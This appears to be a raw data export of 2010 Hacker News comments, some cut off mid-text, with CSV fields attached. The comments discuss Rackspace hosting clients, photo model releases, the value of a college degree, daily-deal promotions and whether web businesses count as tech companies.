I'm sure Rackspace has many clients who run up charges well over $100,000 every month. RackSpace handles some very large clients. Recall that YouTube started out on RackSpace, and was on RackSpace at least till the end of 2006 (I forget the exact date YouTube left RackSpace). RackSpace actually invented a special low rate (regarding bandwidth), just for YouTube, but, instead of paying monthly, YouTube had to pay daily, in exchange for that ultra low rate.<p>I'd guess that RackSpace clients probably follow something of a power curve, with the top 1% of their clients using something like 30% or 40% or 50% of all the bandwidth that RackSpace sells. And of course, that top 1% would have very large monthly bills.",1285527536

For example, my dad (a molecular biologist) is studying the effects that certain genes have on the weight of mice.

1729699,comment,1729285,1729642,0,0,_delirium,,,"I think it's a bit more complex and gray-area when you need a model release, even for commercial publications. The canonical ""need one"" example is using someone's likeness on a billboard to sell products, or on the label of your product. The canonical ""don't need one, even if use is commercial"" example is newspapers publishing photographs taken in a public place as part of an article. For example, you don't need a protester's permission to publish a photo of them at a rally, even if your newspaper/magazine sells ads and is for profit.<p>There's a lot of in-between area, though. This site doesn't seem to be clearly using the photos in the model/advertising sort of way; they're not using them to launch a line of public-transit-rider products or putting them on tshirts or something. It's definitely a step down from journalistic reporting, but I could see it arguably falling closer to that than to the usual cases where model releases are needed. You could imagine a genuine reporter running a story on fashion trends in different demographics or something, illustrated by a few photos taken out in public, and this is basically the half-assed, mean-spirited tabloid version of that focusing on one particular demographic.<p>(Though as far as AdSense in particular goes, Google can of course make up any rules they want.)",1285526889

But to take 60-100k out for a good school, and to get the maximum value, you are talking 4  years of time and effort plus 1-3 likely years salary.<p>In those same 5 years, if you're willing to struggle, take on a little debt, apply yourself to learning whatever it is you were going to be learning in school, you'd likely come out ahead.<p>Maybe I underestimate the opportunities that are opened to you when you get your bachelors.  Obviously, the connections you get from an Ivy league school are priceless.  The work ethic you learn from very motivated individuals is also priceless.<p>But the reality is the vast majority of people going to school aren't going to a top tier school.  They aren't going to bust their ass, they are going to get into debt, and they aren't going to come out of it a super solid prospect.",1285525017

It is up to the business how they choose to retain this new growth, and most businesses employ great customer service and or a slew of other great products at full price.<p>As Fred2baro said, this the businesses chance to engage with a customer you would of otherwise had no access to. That in itself seems worth offering something at cost one time to that new customer.<p>In the case of a restaurant, this is no different then the traditional offering of a ""2 for 1"" or a ""50% off"" deal through traditional media. In both of those situations the restaurant is showing their ""real"" price, as you said, to the would be customer, but with no guarantee of use. This is where the daily deal truly shines, for in order to take advantage of the deal, the would be customer has to put up money, i.e. purchase the deal. Talk about a brilliant incentive to get someone into a business, they are paying the business for the chance to win them as a new customer.

(Just pause for a second here: how many businesses can you think of that _don't_ rely on technology of some description?)<p>Alibaba is a business that leverages the web to make it easier and cheaper for suppliers to find buyers and vice versa. An older version of this is perhaps a physical market, or a convention, or some kind of club or association, or simply your rolodex of business contacts. The guy that started Alibaba recognised that the web could bring together and match buyers and sellers on an entirely new scale, and at a very low cost: good for users, and good for building a huge company.<p>He didn't need to be a tech guy to recognise this. His business is _not_ technology. His business is one of the oldest, and most important of all businesses: introductions.<p>Of course, had he been a tech guy he could have maybe built a website. I don't know his background, but if he had one or more of the following - decent degree, cash or connections he probably didn't find it too hard to raise some money to hire some guys to code the site.<p>A tech business, I would argue, would be one developing or selling technology. I don't know - designing computer chips, or writing specialised compilers for example. For this kind of business, then yes you need to be a technologist - you won't be able to understand your product otherwise. But simply utilising technology maketh not a technology company.<p>So with this definition, absolutely - you do not need to be a techy guy to start one of these businesses (e.g a web-based business). In fact if anything, I reckon it's better if you aren't: technologists often spend way too much time stressing about and optimising the underlying technology, when actually what they need to be worried about is the business model that the technology is powering.<p>Edit: so an example of a ""tech"" business that isn't really a tech business: an e-commerce store. Let's say you just wanted to set up an online store to satisfy the increasing demand for ridiculous office/executive toys. Do you need to be a tech guy to do this? No: what you need is a sound understanding of your product lines, the market size, your route to market & sales channels and so on. In terms of setting up an online shop there's a million providers who'll set this up for you with custom designs, transaction processing and everything else you'll need to get started - just as there are all the other providers of services that you might need - legal advice, accounting, payroll, inventory management, CRM etc etc.",1285524245
